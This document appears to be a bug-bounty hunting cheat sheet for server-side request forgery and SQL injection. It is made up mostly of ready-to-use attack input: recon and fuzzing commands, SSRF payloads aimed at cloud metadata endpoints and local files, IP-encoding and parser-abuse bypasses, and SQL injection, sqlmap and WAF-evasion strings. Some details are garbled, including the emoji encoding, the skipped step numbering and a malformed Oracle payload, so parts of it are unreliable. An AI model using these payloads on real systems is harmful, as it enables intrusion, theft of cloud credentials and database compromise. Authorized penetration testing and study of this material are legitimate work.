üî• SSRF Hunting Checklist

root@cybersec:~$ cat ssrf_hunt.sh
#!/bin/bash
gau $1 | gf ssrf | tee ssrf_candidates.txt

SSRF hunting pipeline activated...

üîç 1. Reconnaissance

Target Parameters:

  • Query Params: url, uri, link, dest, redirect, path, domain, feed, file, image, callback, proxy
  • Headers: X-Forwarded-Host, X-Original-URL, Referer, Host
  • Features: Image preview, avatar fetch, PDF converters, webhooks

Discovery Commands:

  • gau target.com | grep -Ei "url=|redirect=|callback="
  • paramspider -d target.com
  • ffuf -u "https://target.com/?FUZZ=http://collab" -w params.txt

üí£ 2. Basic Exploitation

Confirmation Payloads:

  • http://<your-collab>.oastify.com
  • http://127.0.0.1:80/
  • http://localhost:8080/

Tools for Callback:

  • Burp Collaborator: Built-in DNS/HTTP callback
  • Interactsh: interactsh-client
  • Manual VPS: nc -lvnp 8080

üöÄ 3. Advanced Payloads

Cloud Metadata (üí∞ High Value):

  • AWS: http://169.254.169.254/latest/meta-data/
  • GCP: http://metadata.google.internal/computeMetadata/v1/
  • Azure: http://169.254.169.254/metadata/instance
  • Alibaba: http://100.100.100.200/latest/meta-data/

File Access:

  • file:///etc/passwd
  • file:///c:/windows/win.ini

‚ö° 4. Bypass Techniques

IP Encoding:

  • Decimal: http://2130706433 (127.0.0.1)
  • Hex: http://0x7f000001
  • Octal: http://017700000001
  • IPv6: http://[::1]

Parser Abuse:

  • http://evil.com@127.0.0.1/
  • http://127.0.0.1#evil.com
  • http://127.0.0.1//evil.com

üìã SSRF Testing Workflow

  1. Recon: Find candidate parameters (url=, redirect=, etc.)
  2. Confirm: Test with Collaborator/Interactsh callback
  3. Escalate: Try localhost, internal IPs, metadata

  5. Impact: Show data access, account takeover
  6. Report: Include steps, payloads, and business impact

root@cybersec:~$ cat sqli_recon.sh
#!/bin/bash
subfinder -d $domain -o sub.txt
gau $domain | gf sqli | tee sqli_candidates.txt

SQLi hunting automation ready...

üîç 1. Reconnaissance Phase

Subdomain Enumeration:

  • subfinder -d target.com -o subdomains.txt
  • assetfinder --subs-only target.com
  • amass enum -passive -d target.com

URL Collection:

  • gau target.com | gf sqli | tee sqli-urls.txt
  • waybackurls target.com
  • Google Dorks: inurl:".php?id=" site:target.com

üß™ 2. Parameter Discovery

Hidden Parameter Brute Force:

  • arjun -u https://target.com -m GET -oT arjun.txt
  • paramspider -d target.com -o params.txt
  • ffuf -u https://target.com?FUZZ=1 -w params.txt

Target Parameters:

  • GET: id, page, user, search, cat, item
  • POST: JSON payloads, form data
  • Headers: X-User-Id, Referer, User-Agent
  • Cookies: sessionid, userid, auth

üîß 3. Testing Toolkit

Automated Tools:

  • sqlmap: sqlmap -u "url" --batch --level=5
  • Burp Suite: Intruder + Logger++ extension
  • nuclei: nuclei -t sqli -u target.com

WAF Detection:

  • wafw00f https://target.com
  • Use tamper scripts: --tamper=space2comment

üíâ 4. Payload Categories

Basic Testing:

  • ' OR '1'='1 (Always true)
  • ' AND '1'='2 (Always false)
  • '-- or '# (Comments)

Advanced Techniques:

  • UNION: ' UNION SELECT 1,2,3--
  • Time-based: ' OR SLEEP(5)--
  • Error-based: ' AND updatexml(1,@@version,1)--
  • Boolean: ' AND 1=1--

üõ°Ô∏è 5. WAF Bypass Techniques

Evasion Methods:

  • Case change: UnIoN sElEcT
  • Comment split: UN/**/ION/**/SELECT
  • Double encode: %2527 OR 1=1--
  • Hex encoding: SELECT 0x61646D696E

Advanced Vectors:

  • JSON: {"user":"admin' OR '1'='1"}
  • GraphQL: user(id:"1' OR 1=1")
  • Headers: X-Forwarded-For: ' OR 1=1

üìä 6. Database Fingerprinting

Version Detection:

  • MySQL: ' AND @@version--
  • MSSQL: ' AND DB_NAME()--
  • PostgreSQL: ' AND version()--
  • Oracle: ' AND banner FROM v$version--
